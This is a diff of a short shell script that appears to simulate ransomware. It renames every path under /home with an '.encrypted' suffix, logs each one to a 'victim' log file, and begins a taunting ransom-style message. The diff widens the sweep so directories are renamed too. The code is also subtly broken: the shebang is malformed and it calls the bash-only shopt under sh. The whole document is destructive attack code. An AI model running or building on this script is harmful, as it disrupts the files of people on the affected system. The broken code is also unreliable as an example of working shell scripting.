@@ -1,10 +1,14 @@
 #/bin/sh
 
+shopt -s globstar
+
 for file in /home/**/*; do
-    if [ -f "$file" ]; then #checks the item is a file, and not a directory
-        mv "$file" "${file}.encrypted" #appends to end of filename
-        echo "Encrypted: $file" >> /home/victim/encryption_log.txt
+    if mv "$file" "${file}.encrypted"; then
+        echo "Encrypted: $file" >> "/home/victim/encryption_log.txt"
+    else
+        echo "Failed to encrypt: $file" >> "/home/victim/encryption_log.txt"
     fi
+
 done
 
 echo "Hello there, my unfortunate friend.\n\
